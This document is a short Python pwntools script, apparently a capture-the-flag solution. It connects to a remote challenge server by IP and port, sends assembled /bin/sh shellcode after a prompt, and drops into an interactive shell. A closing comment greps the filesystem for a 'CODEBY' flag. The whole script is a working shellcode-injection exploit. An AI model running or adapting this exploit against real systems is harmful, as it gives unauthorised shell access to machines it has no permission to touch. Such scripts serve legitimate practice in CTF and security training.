from pwn import *

exe = context.binary = ELF('./task')
r = remote('62.173.140.174', 27650)
# r = process([exe.path])

payload = asm(shellcraft.sh())
res = r.recvuntil(b": ")
print(res)
r.sendline(payload)

r.interactive()

# $ grep -r -n -i CODEBY .
